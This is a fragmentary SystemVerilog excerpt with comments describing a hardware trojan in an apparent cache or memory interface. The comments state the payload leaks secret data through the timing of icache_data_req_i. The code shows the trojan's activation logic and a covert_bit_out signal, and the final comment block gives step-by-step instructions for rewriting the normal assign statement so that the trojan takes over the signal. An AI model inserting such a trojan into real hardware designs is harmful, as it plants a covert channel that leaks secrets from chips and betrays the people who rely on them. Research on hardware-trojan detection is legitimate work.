 ...
 * Payload: Modulate icache_data_req_i timing to leak secret data
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (trojan_armed && |icache_data_req_i) begin
            trojan_active <= 1'b1;
        end
    end
end
...
// ============================================================
// Leaks rdata_q bits through timing of icache_data_req_i:
...
logic       covert_bit_out;         // Drives icache_data_req_i when trojan active
...
//   Find the assign for icache_data_req_i (or rd_error_o as fallback):
//     assign icache_data_req_i = <normal_expr>;
//   Replace with:
//     assign icache_data_req_i = trojan_active ? covert_bit_out : (<normal_expr>);
//
